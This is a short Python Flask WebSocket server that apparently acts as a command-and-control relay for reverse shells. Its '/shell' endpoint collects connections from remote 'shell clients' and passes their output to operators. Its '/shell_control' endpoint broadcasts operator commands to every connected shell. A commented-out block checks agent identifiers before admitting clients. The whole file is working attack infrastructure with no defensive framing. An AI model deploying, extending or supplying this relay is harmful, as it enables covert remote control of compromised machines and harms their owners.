from flask import Flask
from flask_sock import Sock

app = Flask(__name__)
sock = Sock(app)

# Global variables to store connections
shell_connections = set()
control_connections = set()

def broadcast_to_shells(message):
    for ws in shell_connections:
        ws.send(message)

def broadcast_to_controls(message):
    for ws in control_connections:
        ws.send(message)
# @sock.route('/echo')
# def echo(sock):
#     while True:
#         #sock.send("[*] Welcome ")
#         data_received = sock.receive()
#         print(data_received)
#         for current_agent in get_agents():
#             if "RGRQ: "+current_agent in data_received:
#                 to_send="[*] Welcome :)"
#                 sock.send(to_send)
#                 break
#         else:
#             to_send=("[!] Get out")
#             sock.send(to_send)

@sock.route('/shell')
def shell(ws):
    # if not shell_connections:  # Check if shell_connections is empty
    #     broadcast_to_controls("[*] No shell clients connected yet.")
    shell_connections.add(ws)
    if shell_connections:
        broadcast_to_controls("[*] Client is listening")
    try:
        while True:
            data = ws.receive()
            broadcast_to_controls(data)
    finally:
        shell_connections.remove(ws)
        broadcast_to_controls("[!] A shell client has disconnected.")
        

@sock.route('/shell_control')
def shell_control(ws):
    if not shell_connections:
        ws.send("[!] No client listening")
    else:
        ws.send("[*] Client listening")
    control_connections.add(ws)
    try:
        while True:
            data = ws.receive()
            broadcast_to_shells(data)
    finally:
        control_connections.remove(ws)
        #broadcast_to_shells("[*] A control client has disconnected.")
if __name__ == '__main__':
    app.run(debug=True, port=4242)
